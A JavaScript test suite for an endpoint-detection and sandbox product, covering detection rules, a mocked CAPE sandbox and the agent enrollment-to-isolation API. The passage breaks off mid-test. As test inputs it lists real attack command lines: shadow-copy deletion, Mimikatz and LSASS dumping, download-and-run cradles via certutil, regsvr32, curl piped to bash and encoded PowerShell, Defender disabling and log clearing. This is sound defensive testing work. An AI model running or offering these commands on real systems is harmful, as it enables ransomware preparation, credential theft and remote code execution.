// Guard Phase 2: endpoint detection rules, the sandbox classifier, and the agent API end to end
// (enroll -> events -> incident -> isolate -> agent confirms -> contained -> release), plus the
// sandbox loop (upload -> fake CAPE -> malicious -> hash shared with another customer).
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, test } from 'node:test';

const { detectEndpoint, normalizeCmd, decodeEncodedCommand, staleAgentAlerts } = await import(
  './packages/dashboard/guard/endpoint-detect.mjs'
);
const { classify, extractFeatures, fitWeights, evaluate, DEFAULT_WEIGHTS, createCapeClient } = await import(
  './packages/dashboard/guard/sandbox.mjs'
);
const { sanitizeEvents, parseAgentToken } = await import('./packages/dashboard/guard/endpoint.mjs');

const T0 = Date.UTC(2026, 10, 14, 10);
let n = 0;
const host = { id: 'gag_00000000000000000001', name: 'FINANCE-PC' };
const proc = (cmdline, extra = {}) => ({
  id: `p${++n}`,
  type: 'process.start',
  at: T0 + n,
  host,
  process: { pid: 1000 + n, name: extra.name || cmdline.split(' ')[0].split('\\').pop(), cmdline, ...extra },
});
const run = (events, extra = {}) => detectEndpoint(events, { orgId: 'org1', ...extra });
const rules = (events, extra) => run(events, extra).alerts.map((a) => a.rule);

// ---------- detection ----------

test('ransomware preparation: shadow copies and recovery, including caret-obfuscated commands', () => {
  for (const cmd of [
    'vssadmin.exe Delete Shadows /All /Quiet',
    'wmic shadowcopy delete',
    'bcdedit /set {default} recoveryenabled No',
    'wbadmin delete catalog -quiet',
    'v^s^s^a^d^m^i^n delete shadows /all',
    'powershell Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete()}',
  ]) {
    assert.ok(rules([proc(cmd, { name: 'cmd.exe' })]).includes('shadow-copy-deletion'), cmd);
  }
  const a = run([proc('vssadmin delete shadows /all /quiet', { name: 'vssadmin.exe' })]).alerts[0];
  assert.equal(a.severity, 'critical');
  assert.equal(a.mitre[0].id, 'T1490');
  assert.deepEqual(a.host, host);
  assert.equal(rules([proc('vssadmin list shadows', { name: 'vssadmin.exe' })]).length, 0, 'listing is fine');
  assert.equal(normalizeCmd('P^o"w"er"S"hell  -nop'), 'powershell -nop');
});

test('credential dumping: Mimikatz, comsvcs MiniDump, ProcDump, SAM hive, LSASS access', () => {
  const cases = [
    ['mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', 'T1003.001'],
    ['rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full', 'T1003.001'],
    ['procdump64.exe -accepteula -ma lsass.exe out.dmp', 'T1003.001'],
    ['reg save HKLM\\SAM C:\\temp\\sam.save', 'T1003.002'],
    ['ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q', 'T1003.003'],
  ];
  for (const [cmd, technique] of cases) {
    const alert = run([proc(cmd)]).alerts.find((x) => x.rule === 'credential-dumping');
    assert.ok(alert, cmd);
    assert.equal(alert.mitre[0].id, technique, cmd);
  }
  const lsass = (name) => ({
    id: `l${++n}`,
    type: 'lsass.access',
    at: T0,
    host,
    process: { pid: 4321, name },
    detail: { access: '0x1010' },
  });
  assert.deepEqual(rules([lsass('evil.exe')]), ['credential-dumping']);
  assert.deepEqual(rules([lsass('MsMpEng.exe')]), [], 'Defender scanning LSASS is normal');
});

test('living off the land, hidden PowerShell (decoded), Office spawning a shell', () => {
  assert.ok(rules([proc('certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe')]).includes('lolbin-abuse'));
  assert.ok(rules([proc('mshta.exe javascript:a=GetObject("script:http://x/y.sct")')]).includes('lolbin-abuse'));
  assert.ok(
    rules([proc('regsvr32 /s /n /u /i:http://203.0.113.5/x.sct scrobj.dll', { name: 'regsvr32.exe' })]).includes(
      'lolbin-abuse',
    ),
  );
  assert.ok(rules([proc('curl -fsSL http://203.0.113.5/i.sh | sudo bash', { name: 'bash' })]).includes('lolbin-abuse'));
  assert.equal(rules([proc('certutil.exe -hashfile setup.exe SHA256')]).length, 0, 'hashing a file is fine');

  const payload = 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/a")';
  const b64 = Buffer.from(payload, 'utf16le').toString('base64');
  assert.equal(decodeEncodedCommand(b64), payload);
  const enc = run([proc(`powershell.exe -NoP -W Hidden -EncodedCommand ${b64}`)]).alerts.find(
    (a) => a.rule === 'encoded-powershell',
  );
  assert.equal(enc.severity, 'critical', 'decodes to a download cradle');
  assert.match(enc.explanation, /decodes to: "IEX \(New-Object Net\.WebClient\)/);
  assert.ok(
    rules([proc('powershell -c "iwr http://x/a.ps1 | iex"', { name: 'powershell.exe' })]).includes(
      'encoded-powershell',
    ),
  );
  assert.equal(rules([proc('powershell.exe -File C:\\scripts\\backup.ps1')]).length, 0);

  const office = proc('cmd.exe /c powershell -w hidden', {
    name: 'cmd.exe',
    parents: [{ name: 'WINWORD.EXE' }, { name: 'explorer.exe' }],
  });
  assert.ok(rules([office]).includes('office-spawned-shell'));
  assert.equal(rules([proc('cmd.exe /c dir', { parents: [{ name: 'explorer.exe' }] })]).length, 0);
});

test('persistence, lateral movement, defense evasion', () => {
  const persist = (p) => ({ id: `s${++n}`, type: 'persistence.created', at: T0, host, persistence: p });
  const risky = run([
    persist({ kind: 'run-key', name: 'Updater', command: 'C:\\Users\\amy\\AppData\\Roaming\\upd.exe' }),
  ]).alerts[0];
  assert.equal(risky.severity, 'high');
  // A new service from Program Files is ordinary software being installed: no alert. The same
  // service from a folder any user can write to is reported, and says why.
  assert.equal(
    run([
      persist({
        kind: 'service',
        name: 'Zoom Sharing Service',
        command: 'C:\\Program Files\\Zoom\\bin\\CptService.exe',
      }),
    ]).alerts.length,
    0,
  );
  const plain = run([
    persist({ kind: 'service', name: 'Sync', command: 'C:\\Users\\amy\\AppData\\Local\\Sync\\svc.exe' }),
  ]).alerts[0];
  assert.equal(plain.severity, 'medium');
  assert.equal(plain.mitre[0].id, 'T1543.003');
  assert.match(plain.explanation, /outside the protected program folders/);
  assert.equal(plain.evidence[0].target.autostart.command, 'C:\\Users\\amy\\AppData\\Local\\Sync\\svc.exe');
  assert.equal(
    run([
      persist({
        kind: 'service',
        name: 'Sync',
        command: 'C:\\Users\\amy\\AppData\\Local\\Sync\\svc.exe',
        signer: { status: 'valid', subject: 'Sync Software Ltd' },
      }),
    ]).alerts.length,
    0,
    'a validly signed program is not reported',
  );
  assert.equal(
    run([persist({ kind: 'cron', name: 'x', command: 'curl http://x | sh' })]).alerts[0].mitre[0].id,
    'T1053.003',
  );
  assert.ok(
    rules([persist({ kind: 'service', name: 'PSEXESVC', command: 'C:\\Windows\\PSEXESVC.exe' })]).includes(
      'lateral-movement',
    ),
  );
  assert.ok(
    rules([
      proc('schtasks /create /sc minute /tn x /tr "powershell -w hidden -f C:\\Users\\Public\\x.ps1"', {
        name: 'schtasks.exe',
      }),
    ]).includes('persistence-created'),
  );
  assert.equal(
    rules([proc('schtasks /create /tn Backup /tr "C:\\Program Files\\Backup\\run.exe"', { name: 'schtasks.exe' })])
      .length,
    0,
    'ordinary scheduled task',
  );

  assert.ok(rules([proc('PsExec64.exe \\\\FILESRV -s cmd.exe')]).includes('lateral-movement'));
  assert.ok(rules([proc('wmic /node:10.0.0.5 process call create "cmd /c whoami"')]).includes('lateral-movement'));
  assert.ok(
    rules([
      proc('powershell Invoke-Command -ComputerName DC01 -ScriptBlock {whoami}', { name: 'powershell.exe' }),
    ]).includes('lateral-movement'),
  );

  assert.ok(
    rules([proc('powershell Set-MpPreference -DisableRealtimeMonitoring $true', { name: 'powershell.exe' })]).includes(
      'defense-evasion',
    ),
  );
  assert.ok(rules([proc('wevtutil cl Security')]).includes('defense-evasion'));
  assert.equal(run([proc('wevtutil cl Security')]).alerts[0].mitre[0].id, 'T1070.001');
});

test('ransomware in action: canary, the agent verdict, rename and entropy bursts', () => {
  const canary = run([
    {
      id: 'c1',
      type: 'canary.touched',
      at: T0,
      host,
      file: { path: 'C:\\Users\\amy\\Documents\\~$budget.docx' },
      process: { pid: 666, name: 'lock.exe' },
      detail: { change: 'renamed', killed: true },
    },
  ]).alerts[0];
  assert.equal(canary.rule, 'canary-touched');
  assert.equal(canary.context.killed, true);
  assert.match(canary.explanation, /stopped the process/);

  const renames = Array.from({ length: 20 }, (_, i) => ({
    id: `r${i}`,
    type: 'file.rename',
    at: T0 + i * 1000,
    host,
    file: { path: `C:\\d\\f${i}.docx.locked`, oldPath: `C:\\d\\f${i}.docx` },
  }));
  assert.deepEqual(rules(renames), ['ransomware-behaviour']);
  assert.deepEqual(rules(renames.slice(0, 19)), []);
  const writes = Array.from({ length: 30 }, (_, i) => ({
    id: `w${i}`,
    type: 'file.write',
    at: T0 + i * 500,
    host,
    file: { path: `C:\\d\\f${i}.docx`, entropy: 7.9 },
  }));
  assert.deepEqual(rules(writes), ['ransomware-behaviour']);
  assert.deepEqual(rules(writes.map((w) => ({ ...w, file: { ...w.file, entropy: 4.2 } }))), [], 'ordinary documents');
  assert.deepEqual(
    rules(writes.map((w, i) => ({ ...w, file: { path: `C:\\d\\.git\\objects\\ab\\${i}`, entropy: 7.9 } }))),
    [],
    'compressed data that is not a document (git objects, caches) is not ransomware',
  );
  const photos = Array.from({ length: 40 }, (_, i) => ({
    id: `ph${i}`,
    type: 'file.rename',
    at: T0 + i * 500,
    host,
    file: { path: `C:\\p\\img${i}.jpg`, oldPath: `C:\\p\\img${i}.jpeg` },
  }));
  assert.deepEqual(rules(photos), [], 'renaming photos to another ordinary type');
});

test('RDP spread, known-malicious hashes, stale agents, allow-list', () => {
  const logon = (h, i) => ({
    id: `g${i}`,
    type: 'logon',
    at: T0 + i * 60_000,
    host: { id: h, name: h },
    logon: { type: 'rdp', source: '10.0.0.66', user: 'admin' },
  });
  const spread = run([logon('A', 1), logon('B', 2), logon('C', 3)]).alerts;
  assert.equal(spread[0].rule, 'rdp-spread');
  assert.equal(spread[0].ip, '10.0.0.66');

  const sha = 'a'.repeat(64);
  const hashes = new Map([[sha, { family: 'LockBit', source: 'Securovix sandbox' }]]);
  const hit = run(
    [
      proc('C:\\Users\\amy\\Downloads\\invoice.exe', {
        name: 'invoice.exe',
        sha256: sha,
        path: 'C:\\Users\\amy\\Downloads\\invoice.exe',
      }),
    ],
    { hashes },
  ).alerts[0];
  assert.equal(hit.rule, 'malicious-file');
  assert.match(hit.explanation, /LockBit/);
  assert.equal(
    run([proc('x.exe', { sha256: sha })], { hashes, allow: new Set([sha]) }).alerts.length,
    0,
    'allow-listed hash',
  );

  // Silence is only an alert for a machine that should stay on, and never when the agent said
  // it was shutting down. A PC that is switched off just shows as offline.
  const quiet = T0 - 20 * 60_000;
  const fleet = [
    {
      id: 'gag_1',
      hostname: 'LAPTOP',
      os: 'windows',
      osVersion: 'Windows 11 Home',
      status: 'active',
      lastSeenAt: quiet,
    },
    { id: 'gag_2', hostname: 'NEW', os: 'linux', status: 'active', lastSeenAt: T0 - 60_000 },
    { id: 'gag_3', hostname: 'web-01', os: 'linux', status: 'active', lastSeenAt: quiet },
    {
      id: 'gag_4',
      hostname: 'DC01',
      os: 'windows',
      osVersion: 'Windows Server 2022',
      status: 'active',
      lastSeenAt: quiet,
    },
    { id: 'gag_5', hostname: 'db-01', os: 'linux', status: 'active', lastSeenAt: quiet },
  ];
  const stale = staleAgentAlerts(fleet, {
    orgId: 'org1',
    now: T0,
    hosts: { gag_5: { offline: { at: quiet + 400, reason: 'shutdown' } } },
  });
  assert.deepEqual(
    stale.map((a) => a.host.name),
    ['web-01', 'DC01'],
  );
  assert.equal(stale[0].rule, 'agent-offline');
  assert.equal(stale[0].severity, 'medium');
  assert.deepEqual(stale[0].mitre, [], 'a health notice, not an attack technique');
  assert.deepEqual(
    staleAgentAlerts(fleet, { orgId: 'org1', now: T0, expectOnline: { gag_1: true, gag_3: false, gag_4: false } }).map(
      (a) => a.host.name,
    ),
    ['LAPTOP', 'db-01'],
    'the owner decides per machine',
  );
});

test('a stopped Guard service is held, then reported if it stays down or comes back unchanged', () => {
  const stop = {
    id: 'st1',
    type: 'agent.tamper',
    at: T0,
    host,
    detail: { reason: 'the Guard service was stopped on this machine' },
  };
  const held = run([stop]);
  assert.equal(held.alerts.length, 0, 'not an alert yet: a restart looks the same');
  assert.equal(held.hosts[host.id].pendingStop.at, T0);
  const uninstall = run([{ ...stop, id: 'st2', detail: { reason: 'the agent is being uninstalled' } }]).alerts[0];
  assert.equal(uninstall.rule, 'agent-tamper');
  assert.equal(uninstall.severity, 'high');
  const said = run([stop, { id: 'st3', type: 'agent.offline', at: T0 + 10, host, detail: { reason: 'shutdown' } }]);
  assert.equal(said.hosts[host.id].pendingStop, undefined, 'a shutdown notice clears it');
  assert.equal(said.hosts[host.id].offline.reason, 'shutdown');
});

test('every endpoint pattern is linear on hostile input', () => {
  const evil = [
    'a'.repeat(200_000),
    `${'certutil -urlcache '.repeat(5000)}x`,
    `${'|'.repeat(100_000)}`,
    `curl ${' '.repeat(100_000)}|`,
    `${'iex '.repeat(20_000)}`,
  ];
  for (const cmd of evil) {
    const started = performance.now();
    run([proc(cmd, { name: 'powershell.exe' })]);
    assert.ok(performance.now() - started < 500, `slow on ${cmd.slice(0, 20)}…`);
  }
});

test('agent events are sanitized: unknown types dropped, strings capped, ids namespaced', () => {
  const agent = { id: 'gag_x', hostname: 'H', os: 'windows' };
  const out = sanitizeEvents(
    agent,
    [
      { type: 'evil.type' },
      {
        id: 'e1',
        type: 'process.start',
        at: T0,
        process: { pid: '12', name: 'x'.repeat(5000), sha256: 'nothex' },
        detail: { big: 'y'.repeat(10_000) },
      },
    ],
    T0,
  );
  assert.equal(out.length, 1);
  assert.equal(out[0].id, 'gag_x:e1');
  assert.equal(out[0].process.name.length, 260);
  assert.equal(out[0].process.sha256, null);
  assert.equal(out[0].host.name, 'H', 'the host comes from the agent record, not the event');
  assert.equal(
    parseAgentToken(`Bearer svxa_gag_00000000000000000001.${'b'.repeat(64)}`).agentId,
    'gag_00000000000000000001',
  );
  assert.equal(parseAgentToken('svxa_bad'), null);
});

// ---------- sandbox ----------

const RANSOM_REPORT = {
  malscore: 9.2,
  malfamily: 'LockBit',
  signatures: [
    {
      name: 'ransomware_file_modifications',
      description: 'Exhibits behavior characteristic of ransomware',
      severity: 3,
      categories: ['ransomware'],
    },
    { name: 'deletes_shadow_copies', description: 'Attempts to delete volume shadow copies', severity: 3 },
    { name: 'antivm_generic_disk', severity: 2, categories: ['anti-vm'] },
  ],
  behavior: {
    summary: {
      executed_commands: ['vssadmin.exe delete shadows /all /quiet'],
      delete_files: Array.from({ length: 80 }, (_, i) => `f${i}`),
    },
  },
  target: { file: { yara: [{ name: 'LockBit3' }] } },
  CAPE: { payloads: [{ sha256: 'x' }] },
};
const CLEAN_REPORT = {
  malscore: 0.4,
  signatures: [{ name: 'reads_self', severity: 1 }],
  behavior: { summary: {} },
  network: { hosts: [{ ip: '13.107.4.50' }] },
};

test('sandbox classifier: ransomware is malicious, an installer is clean, reasons are readable', () => {
  const bad = classify(RANSOM_REPORT);
  assert.equal(bad.verdict, 'malicious');
  assert.ok(bad.score > 0.99);
  assert.equal(bad.family, 'LockBit');
  assert.ok(bad.reasons.includes('ransomware behaviour (mass file encryption)'));
  assert.ok(bad.reasons.includes('deletes shadow copies or disables recovery'));
  assert.deepEqual(bad.yara, ['LockBit3']);
  const good = classify(CLEAN_REPORT);
  assert.equal(good.verdict, 'clean');
  assert.ok(good.score < 0.1);
  assert.equal(extractFeatures({}).features.malscore, 0, 'an empty report does not crash');
});

test('sandbox classifier can be retrained and measured on labelled reports', () => {
  // A set where "network" alone separates the classes, which the default weights ignore.
  const samples = [];
  for (let i = 0; i < 40; i += 1)
    samples.push(
      { label: 1, features: { network: 1, malscore: 0.2 } },
      { label: 0, features: { network: 0, malscore: 0.2 } },
    );
  const before = evaluate(samples, DEFAULT_WEIGHTS);
  const weights = fitWeights(samples, { epochs: 800, rate: 1 });
  const afterFit = evaluate(samples, weights);
  assert.ok(before.recall < 0.5, 'default weights miss these');
  assert.equal(afterFit.accuracy, 1, 'retrained weights separate them');
  assert.ok(weights.network > DEFAULT_WEIGHTS.network);
});

// ---------- the agent API, end to end ----------

const cape = { tasks: new Map(), next: 1, submitted: [] };
const capeServer = createServer((req, res) => {
  const send = (obj) => {
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify(obj));
  };
  if (req.method === 'POST' && req.url === '/apiv2/tasks/create/file/') {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      const id = cape.next++;
      const body = Buffer.concat(chunks).toString('latin1');
      cape.submitted.push({ id, auth: req.headers.authorization, ransom: body.includes('RANSOM-SAMPLE') });
      cape.tasks.set(id, body.includes('RANSOM-SAMPLE') ? RANSOM_REPORT : CLEAN_REPORT);
      send({ error: false, data: { task_ids: [id] } });
    });
    return;
  }
  const status = /^\/apiv2\/tasks\/status\/(\d+)\/$/.exec(req.url);
  if (status) return send({ error: false, data: 'reported' });
  const report = /^\/apiv2\/tasks\/get\/report\/(\d+)\/$/.exec(req.url);
  if (report) return send(cape.tasks.get(Number(report[1])));
  res.statusCode = 404;
  send({ error: true });
});
await new Promise((resolve) => capeServer.listen(0, '127.0.0.1', resolve));

const dataDir = mkdtempSync(join(tmpdir(), 'shannon-endpoint-test-'));
Object.assign(process.env, {
  SHANNON_DATA_DIR: dataDir,
  SHANNON_FORCE_LOCAL_DB: '1',
  SHANNON_SESSION_SECRET: 'endpoint-test-secret-that-is-long-enough-0123',
  SHANNON_SIGNUP_RATE_LIMIT: '50',
  SHANNON_GUARD_INTEL: '0',
  SHANNON_CAPE_URL: `http://127.0.0.1:${capeServer.address().port}`,
  SHANNON_CAPE_TOKEN: 'cape-test-token',
  // The dashboard's own Defender, enforcing: agent uploads quote attack commands and must pass.
  SHANNON_DEFEND_SELF: '1',
  SHANNON_DEFEND_SELF_MODE: 'enforce',
  NODE_ENV: 'test',
});
const { startDashboard, runGuardCycles } = await import('./packages/dashboard/server.mjs');
const db = await import('./packages/dashboard/db.mjs');
const server = await startDashboard({ port: 0, scheduleMonitors: false });
const base = `http://127.0.0.1:${server.address().port}`;
after(async () => {
  await new Promise((resolve) => server.close(resolve));
  await new Promise((resolve) => capeServer.close(resolve));
  rmSync(dataDir, { recursive: true, force: true });
});

async function call(path, { method = 'GET', cookie, token, body, raw, headers = {} } = {}) {
  const h = { ...headers };
  if (cookie) h.cookie = cookie;
  if (token) h.authorization = `Bearer ${token}`;
  if (body !== undefined) h['content-type'] = 'application/json';
  if (raw) h['content-type'] = 'application/octet-stream';
  const response = await fetch(base + path, {
    method,
    headers: h,
    body: raw || (body === undefined ? undefined : JSON.stringify(body)),
  });
  return { status: response.status, json: await response.json().catch(() => ({})) };
}
async function signup(email) {
  const response = await fetch(`${base}/api/auth/signup`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      email,
      name: email.split('@')[0],
      password: 'correct-horse-battery-staple',
      acceptedTerms: true,
    }),
  });
  const json = await response.json();
  return {
    cookie: response.headers.get('set-cookie').split(';')[0],
    orgId: json.organizations[0].id,
    userId: json.user.id,
  };
}
const owner = await signup('endpoint-owner@example.test');
const other = await signup('endpoint-other@example.test');
const viewer = await signup('endpoint-viewer@example.test');
db.saveMembership({ orgId: owner.orgId, userId: viewer.userId, role: 'viewer', createdAt: Date.now() });

let agentToken;
let agentId;
let incidentId;

test('enrollment: admins create a one-time token; the agent trades it for its own credential', async () => {
  assert.equal(
    (
      await call('/api/guard/endpoints/enroll-token', {
        method: 'POST',
        cookie: viewer.cookie,
        headers: { 'x-shannon-org': owner.orgId },
      })
    ).status,
    403,
  );
  const made = await call('/api/guard/endpoints/enroll-token', { method: 'POST', cookie: owner.cookie });
  assert.equal(made.status, 201);
  assert.match(made.json.token, /^svxe_/);
  assert.equal(
    (
      await call('/api/endpoint-agent/v1/enroll', {
        method: 'POST',
        body: { token: `${made.json.token.slice(0, -1)}0` },
      })
    ).status,
    401,
  );
  const enrolled = await call('/api/endpoint-agent/v1/enroll', {
    method: 'POST',
    body: {
      token: made.json.token,
      hostname: 'FINANCE-PC',
      os: 'windows',
      arch: 'x86_64',
      version: '0.1.0',
      machineId: 'm-1',
    },
  });
  assert.equal(enrolled.status, 201, JSON.stringify(enrolled.json));
  agentToken = enrolled.json.token;
  agentId = enrolled.json.agentId;
  assert.match(agentToken, /^svxa_gag_/);
  assert.equal(enrolled.json.policy.ransomware.autoKill, true);
  assert.equal(enrolled.json.policy.autoSubmitExecutables, true, 'a sandbox is configured');
  const again = await call('/api/endpoint-agent/v1/enroll', {
    method: 'POST',
    body: { token: made.json.token, hostname: 'FINANCE-PC', os: 'windows', machineId: 'm-1' },
  });
  assert.equal(again.json.agentId, agentId, 're-installing on the same machine keeps one record');
  assert.equal(
    (await call('/api/endpoint-agent/v1/checkin', { method: 'POST', token: agentToken, body: {} })).status,
    401,
    'the old credential stopped working',
  );
  agentToken = again.json.token;
  assert.equal((await call('/api/endpoint-agent/v1/checkin', { method: 'POST', body: {} })).status, 401);
  const list = await call('/api/guard/endpoints', { cookie: owner.cookie });
  assert.equal(list.json.agents.length, 1);
  assert.equal(list.json.agents[0].secretHash, undefined);
  assert.equal((await call('/api/guard/endpoints', { cookie: other.cookie })).json.agents.length, 0);
});

test('events become a critical ransomware incident; the dashboard Defender lets the evidence through', async () => {
  const checkin = await call('/api/endpoint-agent/v1/checkin', {
    method: 'POST',
    token: agentToken,
    body: { policyVersion: 0, hashVersion: -1, stats: { cpuPercent: 0.4, memoryMb: 21 } },
  });
  assert.equal(checkin.status, 200);
  assert.ok(checkin.json.policy, 'policy sent when the agent has an old version');
  assert.deepEqual(checkin.json.commands, []);
  const now = Date.now();
  const events = [
    {
      id: 'e1',
      type: 'process.start',
      at: now - 5000,
      process: {
        pid: 4100,
        name: 'cmd.exe',
        cmdline: 'cmd.exe /c vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet',
        parents: [{ name: 'lock.exe', pid: 4000 }],
      },
    },
    {
      id: 'e2',
      type: 'canary.touched',
      at: now - 3000,
      file: { path: 'C:\\Users\\amy\\Documents\\~$securovix.docx' },
      process: { pid: 4000, name: 'lock.exe' },
      detail: { change: 'renamed', killed: false },
    },
    {
      id: 'e3',
      type: 'process.start',
      at: now - 2000,
      process: { pid: 4200, name: 'mimikatz.exe', cmdline: 'mimikatz.exe sekurlsa::logonpasswords' },
    },
  ];
  const sent = await call('/api/endpoint-agent/v1/events', { method: 'POST', token: agentToken, body: { events } });
  assert.equal(sent.status, 200, JSON.stringify(sent.json));
  assert.equal(sent.json.accepted, 3);
  assert.ok(sent.json.alerts >= 3);
  const list = await call('/api/guard/incidents', { cookie: owner.cookie });
  const incident = list.json.incidents.find((i) => i.title === 'Likely ransomware: FINANCE-PC');
  assert.ok(incident, JSON.stringify(list.json.incidents.map((i) => i.title)));
  assert.equal(incident.severity, 'critical');
  incidentId = incident.id;
  const resent = await call('/api/endpoint-agent/v1/events', { method: 'POST', token: agentToken, body: { events } });
  assert.equal(resent.json.alerts, 0, 'a retried upload raises nothing twice');
});

test('isolate from the incident: pending until the agent confirms, then contained; release re-opens', async () => {
  const detail = await call(`/api/guard/incidents/${incidentId}`, { cookie: owner.cookie });
  const isolate = detail.json.incident.actions.find((a) => a.type === 'isolate-host');
  assert.deepEqual(isolate.params, { host: agentId, hostName: 'FINANCE-PC' });
  const acted = await call(`/api/guard/incidents/${incidentId}/actions`, {
    method: 'POST',
    cookie: owner.cookie,
    body: { type: 'isolate-host', params: isolate.params },
  });
  assert.equal(acted.status, 200, JSON.stringify(acted.json));
  assert.equal(acted.json.action.status, 'pending');
  assert.equal(acted.json.incident.status, 'open', 'not contained until the machine confirms');

  const checkin = await call('/api/endpoint-agent/v1/checkin', {
    method: 'POST',
    token: agentToken,
    body: { policyVersion: 1 },
  });
  assert.equal(checkin.json.commands.length, 1);
  const command = checkin.json.commands[0];
  assert.equal(command.type, 'isolate-host');
  const result = await call('/api/endpoint-agent/v1/results', {
    method: 'POST',
    token: agentToken,
    body: {
      commandId: command.id,
      ok: true,
      detail: 'Firewall now blocks everything except Securovix.',
      data: { previousPolicy: 'blockinbound,allowoutbound' },
    },
  });
  assert.equal(result.status, 200);
  const contained = (await call(`/api/guard/incidents/${incidentId}`, { cookie: owner.cookie })).json;
  assert.equal(contained.incident.status, 'contained');
  assert.equal((await call('/api/guard/endpoints', { cookie: owner.cookie })).json.agents[0].isolated, true);
  const action = contained.actionsTaken.find((a) => a.type === 'isolate-host');
  assert.equal(action.status, 'done');
  assert.equal(action.undoable, true);

  assert.equal(
    (
      await call(`/api/guard/endpoints/${agentId}/actions`, {
        method: 'POST',
        cookie: viewer.cookie,
        headers: { 'x-shannon-org': owner.orgId },
        body: { type: 'release-host' },
      })
    ).status,
    403,
  );
  const release = await call(`/api/guard/endpoints/${agentId}/actions`, {
    method: 'POST',
    cookie: owner.cookie,
    body: { type: 'release-host' },
  });
  assert.equal(release.status, 200, JSON.stringify(release.json));
  const next = await call('/api/endpoint-agent/v1/checkin', {
    method: 'POST',
    token: agentToken,
    body: { policyVersion: 1 },
  });
  assert.equal(next.json.commands[0].type, 'release-host');
  assert.deepEqual(
    next.json.commands[0].undoData,
    { previousPolicy: 'blockinbound,allowoutbound' },
    'the agent gets back what it saved',
  );
  await call('/api/endpoint-agent/v1/results', {
    method: 'POST',
    token: agentToken,
    body: { commandId: next.json.commands[0].id, ok: true, detail: 'Network restored.' },
  });
  const reopened = (await call(`/api/guard/incidents/${incidentId}`, { cookie: owner.cookie })).json;
  assert.equal(reopened.incident.status, 'open', 'released, so no longer contained');
  assert.ok(reopened.actionsTaken.find((a) => a.type === 'isolate-host').undoneAt);
  assert.equal((await call('/api/guard/endpoints', { cookie: owner.cookie })).json.agents[0].isolated, false);
});

test('sandbox: an uploaded sample is analysed, a malicious verdict blocks the hash for every customer', async () => {
  const bytes = Buffer.from('MZ fake executable RANSOM-SAMPLE do not run');
  const sha = createHash('sha256').update(bytes).digest('hex');
  assert.equal(
    (
      await call('/api/endpoint-agent/v1/samples', {
        method: 'POST',
        token: agentToken,
        raw: bytes,
        headers: { 'x-sha256': 'f'.repeat(64) },
      })
    ).status,
    400,
    'hash mismatch',
  );
  const up = await call('/api/endpoint-agent/v1/samples', {
    method: 'POST',
    token: agentToken,
    raw: bytes,
    headers: { 'x-sha256': sha, 'x-file-name': 'invoice.exe' },
  });
  assert.equal(up.status, 201, JSON.stringify(up.json));
  assert.equal(up.json.sample.status, 'analyzing');
  assert.equal(cape.submitted.at(-1).auth, 'Token cape-test-token');

  await runGuardCycles();
  const overview = (await call('/api/guard/endpoints', { cookie: owner.cookie })).json;
  const sample = overview.samples.find((s) => s.sha256 === sha);
  assert.equal(sample.verdict, 'malicious');
  assert.equal(sample.family, 'LockBit');
  assert.equal(overview.sandbox.knownMaliciousHashes, 1);

  // Another customer's machine learns the hash at its next check-in, and running it is critical.
  const otherToken = (await call('/api/guard/endpoints/enroll-token', { method: 'POST', cookie: other.cookie })).json
    .token;
  const otherAgent = (
    await call('/api/endpoint-agent/v1/enroll', {
      method: 'POST',
      body: { token: otherToken, hostname: 'SHOP-TILL', os: 'windows', machineId: 'm-2' },
    })
  ).json;
  const hashes = (
    await call('/api/endpoint-agent/v1/checkin', { method: 'POST', token: otherAgent.token, body: { hashVersion: 0 } })
  ).json.hashes;
  assert.deepEqual(hashes.list, [sha]);
  await call('/api/endpoint-agent/v1/events', {
    method: 'POST',
    token: otherAgent.token,
    body: {
      events: [
        {
          id: 'm1',
          type: 'malware.blocked',
          at: Date.now(),
          file: { path: 'C:\\Users\\Public\\inv.exe', sha256: sha },
          detail: { quarantined: true },
        },
      ],
    },
  });
  const otherIncidents = (await call('/api/guard/incidents', { cookie: other.cookie })).json.incidents;
  assert.equal(otherIncidents.length, 1);
  assert.equal(otherIncidents[0].status, 'contained', 'the agent quarantined it itself');
  const otherView = (await call('/api/guard/endpoints', { cookie: other.cookie })).json;
  assert.equal(otherView.samples.length, 0, "the other customer never sees the first customer's sample");
});

test('retiring a machine revokes its credential', async () => {
  assert.equal((await call(`/api/guard/endpoints/${agentId}`, { method: 'DELETE', cookie: other.cookie })).status, 404);
  assert.equal((await call(`/api/guard/endpoints/${agentId}`, { method: 'DELETE', cookie: owner.cookie })).status, 200);
  assert.equal(
    (await call('/api/endpoint-agent/v1/checkin', { method: 'POST', token: agentToken, body: {} })).status,
    401,
  );
});

test('CAPE client speaks the v2 API', async () => {
  const seen = [];
  const fake = async (url, init) => {
    seen.push(`${init?.method || 'GET'} ${url}`);
    return {
      ok: true,
      status: 200,
      headers: new Headers(),
      json: async () => ({ error: false, data: { task_ids: [7] } }),
      text: async () => JSON.stringify({ error: false, data: 'reported' }),
    };
  };
  const client = createCapeClient({
    config: { url: 'https://cape.example.test', token: 't', timeoutSec: 120 },
    fetchImpl: fake,
  });
  assert.equal(await client.submit({ bytes: Buffer.from('x'), filename: 'a.exe' }), 7);
  assert.equal(await client.status(7), 'reported');
  assert.deepEqual(seen, [
    'POST https://cape.example.test/apiv2/tasks/create/file/',
    'GET https://cape.example.test/apiv2/tasks/status/7/',
  ]);
  assert.equal(createCapeClient({ config: null }).configured(), false);
});

// ---------- getting the agent onto a machine ----------

test('the agent downloads with one unauthenticated command and carries the checksum of the build', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'shannon-agent-builds-'));
  process.env.SHANNON_GUARD_AGENT_DIR = dir;
  try {
    // No build on this server: a clear answer, and the dashboard knows not to offer a command.
    const none = await fetch(`${base}/api/endpoint-agent/v1/download/linux`);
    assert.equal(none.status, 404);
